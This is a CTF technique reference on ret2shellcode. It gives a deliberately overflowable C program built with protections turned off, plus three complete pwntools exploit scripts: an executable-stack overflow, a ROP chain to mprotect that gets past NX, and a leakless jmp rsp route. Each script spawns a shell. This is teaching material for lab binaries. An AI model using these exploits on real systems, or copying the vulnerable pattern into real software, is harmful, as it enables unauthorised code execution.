---
title: "ret2shellcode - Jumping Into Your Own Bytes"
category: pwn
subcategory: shellcode
type: technique
tags: [shellcode, ret2shellcode, execstack, nx, nopsled, mprotect, mmap, rop, jmp-rsp, aslr, pie, relro, canary, stack-buffer-overflow, gets, strcpy, read, pwntools, ropgadget, checksec]
difficulty: medium
summary: "Write shellcode into a writable+executable buffer and redirect execution to it; when NX is on, ROP to mprotect(page,len,7) first."
when_to_use:
  - "checksec reports 'NX disabled' / 'Has RWX segments' on the target binary"
  - "You control a large buffer whose address you can leak or predict"
  - "Static binary with no useful libc but plenty of syscall gadgets (mprotect route)"
  - "The challenge deliberately mmap()s an RWX page and reads bytes into it"
  - "You need arbitrary syscalls (ORW, seccomp games) rather than just a one-shot system('/bin/sh')"
tools: [pwntools, checksec, gdb, pwndbg, gef, ropgadget, ropper, nasm, objdump, one-gadget]
related: [stack-buffer-overflow-basics, stack-ret2win, shellcode-crafting, shellcode-seccomp-orw, shellcode-arm-mips, rop-fundamentals, rop-stack-pivot, rop-static-binary, mitigation-modern-playbook]
---

## TL;DR

Put machine code somewhere in the process, then set `rip` to it. On an `-z execstack`
binary the stack itself is the landing pad, so the classic overflow becomes
`shellcode + padding + p64(&buf)`. With NX on, the code still has to live in an
executable page, so you first ROP into `mprotect(page, len, PROT_READ|PROT_WRITE|PROT_EXEC)`
(syscall 10) or `mmap()` a fresh RWX page, then return into it.

## Recognise it

- `checksec --file=./vuln` prints `NX:  NX disabled` or `RWX: Has RWX segments`.
- The program helpfully prints a pointer: `printf("buf is at %p\n", buf)` or "your input is stored at ...".
- `gets()`, `strcpy()`, `scanf("%s")`, or `read(0, buf, BIG)` writing into a stack array.
- `vmmap` in pwndbg/gef shows a `rwx` region (often an `mmap`ed scratch page at a fixed address).
- The binary is tiny, statically linked, and has no `system` / no `/bin/sh` string, but
  `ROPgadget --binary ./vuln --only 'syscall'` returns hits -> mprotect route.
- A function pointer, GOT entry, or `__malloc_hook`-style slot you can overwrite with a heap/stack address.

## Vulnerable source

```c
/* vuln.c - classic executable-stack overflow with a free address leak */
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char buf[256];

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);

    printf("buf is at %p\n", (void *)buf);
    printf("say something: ");
    read(0, buf, 1024);          /* 1024 > 256: straight stack smash */
    puts("bye");
    return 0;
}
```

Build it exactly like this (executable stack, no PIE, no canary, no RELRO):

```sh
# -z execstack       : mark GNU_STACK PT_LOAD as RWX (this is what makes ret2shellcode work)
# -fno-stack-protector: no canary between buf and saved rbp
# -no-pie            : fixed code addresses, so gadgets are stable
# -z norelro         : GOT stays writable (handy for variants)
gcc -m64 -fno-stack-protector -z execstack -no-pie -z norelro -O0 -o vuln vuln.c

# NX-on build, for the mprotect variant below (note: no -z execstack)
gcc -m64 -fno-stack-protector -no-pie -static -O0 -o vuln_nx vuln.c
```

Sanity check before exploiting:

```sh
checksec --file=./vuln          # expect: NX disabled
readelf -lW ./vuln | grep STACK # expect: GNU_STACK ... RWE
```

## Theory

**Where can code run?** The CPU refuses to fetch instructions from a page without the
execute bit (NX/XD, enforced per-page by the MMU). Linux derives the stack's permissions
from the `PT_GNU_STACK` program header: `RW` -> non-executable stack, `RWE` -> executable
stack. `-z execstack` flips that header; the loader then maps the stack RWX, and (for
historical ABI reasons) some kernels/loaders also make other mappings executable.

**Getting rip there.** Any of the usual control-flow primitives works: overwriting a saved
return address, a function pointer, a GOT entry, `__stack_chk_fail`'s entry, a C++ vtable.
ret2shellcode is orthogonal to how you hijack control; it only changes *what* you jump to.

**Knowing the address.** Three options, in order of preference:

1. **Leak it.** The program prints it, or a format-string/uninitialised read gives you a stack pointer.
2. **Turn ASLR off** (`setarch -R ./vuln`, or the challenge's Docker runs with ASLR disabled).
   Then the stack top is constant for a fixed `argv`/`envp`.
3. **Jump relative to `rsp`.** At the instant `ret` executes, `rsp` points just past the
   return address, i.e. *into your payload*. A `jmp rsp` (`ff e4`) or `push rsp; ret`
   gadget therefore needs no leak at all.

**The `sub rsp` trick.** `jmp rsp` lands you at the very end of the payload, where there is
usually little room. Put a two-instruction stub there that rewinds the stack pointer back
into the buffer and jumps again:

```nasm
    sub rsp, 0x120          ; 48 81 ec 20 01 00 00  - walk back into buf
    jmp rsp                 ; ff e4                 - land on the NOP sled
```

**NOP sled.** Stack addresses wobble by a few bytes between environments. Prefixing the
real shellcode with a few hundred `0x90` bytes means any landing address inside the sled
slides down into your code. A sled costs nothing when the buffer is large and buys you
enormous tolerance; it does *not* defeat full ASLR (entropy is ~28 bits on x86-64 stacks).

**When NX is on.** You cannot execute the stack, but `mprotect(2)` can add `PROT_EXEC`
to any page you own:

```
mprotect(void *addr, size_t len, int prot)   // syscall 10
  addr must be page-aligned (addr & ~0xfff)
  prot = PROT_READ|PROT_WRITE|PROT_EXEC = 1|2|4 = 7
```

So the ROP chain is: `rdi = page`, `rsi = 0x1000`, `rdx = 7`, `rax = 10`, `syscall`,
then `ret` into the shellcode that already sits on that page. `mmap(2)` (syscall 9) with
`MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED` is the alternative when you would rather build a
brand-new RWX page at an address of your choosing (e.g. `0xcafe0000`) and then `read(0, page, n)`
your shellcode into it.

## Attack

1. `checksec` + `readelf -lW | grep STACK`. Executable stack -> plan A. NX -> plan B (mprotect).
2. Find the offset to the saved return address: `cyclic 300` / `pattern create`, crash,
   `cyclic -l $rsp` or `pattern offset`. For `char buf[256]` with no canary it is `256 + 8 = 264`.
3. Obtain a landing address:
   - parse the leaked pointer from the banner, or
   - disable ASLR and read `buf`'s address once in gdb (remember gdb's env differs), or
   - locate a `jmp rsp` / `push rsp; ret` gadget: `ROPgadget --binary ./vuln | grep -E 'jmp rsp|push rsp'`.
4. Assemble the shellcode with `context.arch = 'amd64'` and `shellcraft.sh()` (or your own
   null-free `execve` stub, see `shellcode-crafting`).
5. Lay out the payload. Two standard layouts:
   - **shellcode-first:** `sled + shellcode + pad_to(264) + p64(buf + sled_offset)`
   - **shellcode-after-ret:** `pad(264) + p64(jmp_rsp) + sled + shellcode`
6. Send it, then `p.interactive()`. If it dies, single-step the return in gdb:
   `gdb -q ./vuln -ex 'b *main+NN'` and check `x/16i $rsp` right at the `ret`.

## Exploit

Plan A - executable stack, address leaked by the binary:

```python
#!/usr/bin/env python3
"""ret2shellcode on an -z execstack binary that leaks its own buffer address."""
from pwn import *

context.binary = exe = ELF("./vuln", checksec=False)
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)

OFFSET = 264          # char buf[256] + saved rbp
SLED = 0x40           # bytes of 0x90 in front of the shellcode


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="b *main+120\nc\n")
    return process([exe.path])


def main():
    io = start()

    # "buf is at 0x7ffd1234abcd"
    io.recvuntil(b"buf is at ")
    buf = int(io.recvline().strip(), 16)
    log.success("buf @ %#x", buf)

    sc = asm(shellcraft.amd64.linux.sh())
    log.info("shellcode is %d bytes", len(sc))

    payload = b"\x90" * SLED + sc
    assert len(payload) <= OFFSET, "shellcode does not fit in the buffer"
    payload = payload.ljust(OFFSET, b"A")
    payload += p64(buf + SLED // 2)        # land in the middle of the sled

    io.recvuntil(b"say something: ")
    io.send(payload)

    io.sendline(b"id; cat flag.txt")
    io.interactive()


if __name__ == "__main__":
    main()
```

Plan B - NX enabled, static binary, ROP to `mprotect` then return into the stack:

```python
#!/usr/bin/env python3
"""NX bypass: ROP mprotect(stack_page, 0x1000, PROT_RWX) then fall into shellcode."""
from pwn import *

context.binary = exe = ELF("./vuln_nx", checksec=False)
context.arch = "amd64"

OFFSET = 264
PROT_RWX = 7
SYS_MPROTECT = 10


def find(gadget):
    """Resolve a gadget by assembly text, aborting loudly if it is missing."""
    rop = ROP(exe)
    addr = rop.find_gadget(gadget)
    if addr is None:
        log.error("missing gadget: %s", gadget)
    return addr.address


def main():
    io = process([exe.path]) if not args.REMOTE else remote(args.HOST or "127.0.0.1",
                                                            int(args.PORT or 1337))

    io.recvuntil(b"buf is at ")
    buf = int(io.recvline().strip(), 16)
    page = buf & ~0xFFF
    log.success("buf @ %#x -> page %#x", buf, page)

    pop_rdi = find(["pop rdi", "ret"])
    pop_rsi = find(["pop rsi", "ret"])
    pop_rdx = find(["pop rdx", "ret"])
    pop_rax = find(["pop rax", "ret"])
    syscall = find(["syscall", "ret"])

    sc = asm(shellcraft.amd64.linux.sh())

    chain = b"".join([
        p64(pop_rdi), p64(page),
        p64(pop_rsi), p64(0x2000),        # cover the page and the next one
        p64(pop_rdx), p64(PROT_RWX),
        p64(pop_rax), p64(SYS_MPROTECT),
        p64(syscall),
    ])

    # The shellcode lands directly behind the chain, still on the (now RWX) stack.
    sc_addr = buf + OFFSET + 8 + len(chain) + 8 + 0x20
    payload = b"A" * OFFSET
    payload += chain
    payload += p64(sc_addr)
    payload += b"\x90" * 0x20 + sc

    io.recvuntil(b"say something: ")
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

Plan C - no leak at all: `jmp rsp` plus the `sub rsp` rewind stub.

```python
#!/usr/bin/env python3
"""Leakless ret2shellcode: ret -> 'jmp rsp' -> 'sub rsp, N; jmp rsp' -> sled -> shellcode."""
from pwn import *

context.binary = exe = ELF("./vuln", checksec=False)
context.arch = "amd64"

OFFSET = 264


def main():
    io = process([exe.path]) if not args.REMOTE else remote(args.HOST or "127.0.0.1",
                                                            int(args.PORT or 1337))

    # ff e4 == jmp rsp ; works in any executable segment of a no-PIE binary
    jmp_rsp = next(exe.search(asm("jmp rsp")))
    log.success("jmp rsp @ %#x", jmp_rsp)

    sc = asm(shellcraft.amd64.linux.sh())
    sled = b"\x90" * 0x40

    # Everything before the saved rip: sled + shellcode, padded out.
    front = sled + sc
    assert len(front) <= OFFSET
    front = front.ljust(OFFSET, b"\x90")

    # rsp at the moment of the final 'jmp rsp' points here; rewind into the sled.
    stub = asm("sub rsp, %d\njmp rsp" % (OFFSET + 8 + 0x20))

    payload = front + p64(jmp_rsp) + stub
    io.recvuntil(b"say something: ")
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **`read` vs `gets` vs `scanf`.** `gets`/`scanf("%s")` stop at `\n` (0x0a) and `scanf` also
  at spaces/tabs, so your shellcode must be free of those bytes. `read` and `fread` take
  anything including NUL. See `shellcode-crafting` for null-free encodings.
- **Stack address stability.** The initial stack contents are `argv`, `envp`, and the
  auxiliary vector, so *every byte of the environment shifts your buffer*. Debugging in gdb
  adds `LINES`, `COLUMNS`, and a different `argv[0]` path; a remote service run from a
  different cwd shifts again. Reproduce the target environment with
  `env -i ./vuln`, `setarch -R env -i ./vuln`, or `gdb.debug(..., env={})`. A NOP sled hides
  small shifts; a large sled plus a few retries hides bigger ones.
- **ASLR.** With ASLR on, a stack leak is mandatory unless you use the `jmp rsp` route.
  Brute-forcing 28 bits of stack entropy is only viable against a forking server that does
  not re-exec (see `mitigation-partial-overwrite-brute`).
- **`mprotect` alignment.** `addr` must be page-aligned or the syscall returns `-EINVAL`
  and the chain silently continues into garbage. Always `addr & ~0xfff`, and request enough
  length to cover the shellcode if it straddles a page boundary.
- **`mmap` fixed page.** `mmap(0xcafe0000, 0x1000, 7, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0)`
  (syscall 9, flags `0x32`) gives a predictable RWX page; follow it with
  `read(0, 0xcafe0000, 0x400)` and a `ret` to `0xcafe0000`. Handy when the stack is too
  small for both a chain and shellcode.
- **RWX already present.** Many "shellcode jail" challenges `mmap` an RWX buffer, `read`
  your bytes into it and `call` it outright. Then there is no overflow at all, and the
  whole challenge is the shellcode itself (byte filters, seccomp - see `shellcode-seccomp-orw`).
- **Canary.** `-fno-stack-protector` is doing a lot of work in the build above. With a canary
  you need a leak or an overwrite path that skips it (`mitigation-canary-bypass`).
- **W^X on modern kernels.** Some hardened kernels/`PaX` refuse `mprotect` from RW to RWX
  (`MPROTECT` feature). In mainstream CTF Docker images it works fine.
- **Shellcode in the environment.** Classic `LD_PRELOAD`-free trick: stuff the shellcode in
  an env var and jump near the top of the stack. Only works if you control the environment,
  which in remote CTFs you usually do not.
- **32-bit.** Everything holds with `jmp esp` (`ff e4` as well), `mprotect` = int 0x80
  syscall 125, and `p32()` addresses.

## Tools

```sh
# Mitigations at a glance
checksec --file=./vuln
readelf -lW ./vuln | grep -A1 GNU_STACK

# Offset to saved rip
python3 -c 'from pwn import *; print(cyclic(400).decode())' | ./vuln
# then in gdb: cyclic -l $rsp     (pwndbg)   /  pattern offset $rsp  (gef)

# Gadget hunting
ROPgadget --binary ./vuln --only 'pop|ret'
ROPgadget --binary ./vuln | grep -E 'jmp (r|e)sp|push (r|e)sp'
ropper --file ./vuln --search 'jmp rsp'

# Assemble / inspect shellcode outside pwntools
nasm -f elf64 sc.asm -o sc.o && objdump -d sc.o
python3 -c 'from pwn import *; context.arch="amd64"; print(disasm(open("sc.bin","rb").read()))'

# Runtime
setarch -R ./vuln            # disable ASLR for this process only
gdb -q ./vuln -ex 'set disable-randomization on'
# pwndbg/gef: vmmap   -> look for the rwx row
```
